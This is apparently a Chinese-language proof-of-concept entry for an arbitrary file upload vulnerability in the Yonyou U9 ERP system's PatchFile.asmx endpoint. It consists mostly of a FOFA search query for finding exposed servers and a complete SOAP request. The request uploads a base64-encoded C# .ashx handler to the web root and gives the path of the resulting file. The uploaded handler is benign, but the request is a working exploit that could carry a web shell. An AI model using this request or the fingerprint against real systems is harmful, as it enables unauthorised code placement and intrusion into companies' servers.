## 用友U9-PatchFile.asmx接口存在任意文件上传漏洞

用友U9聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。

## fofa
```
body="logo-u9.png"
```

## poc
```
POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/SaveFile"
Content-Length: 880

<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
   <SaveFile xmlns="http://tempuri.org/">
    <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIik7IAogICAgICAgIH0gCiAgICB9</binData>
    <path>./</path>
    <fileName>testtest.ashx</fileName>
   </SaveFile>
  </soap:Body>
 </soap:Envelope>
```

上传后的路径 
`http://127.0.0.1/CS/Office/AutoUpdates/testtest.ashx`
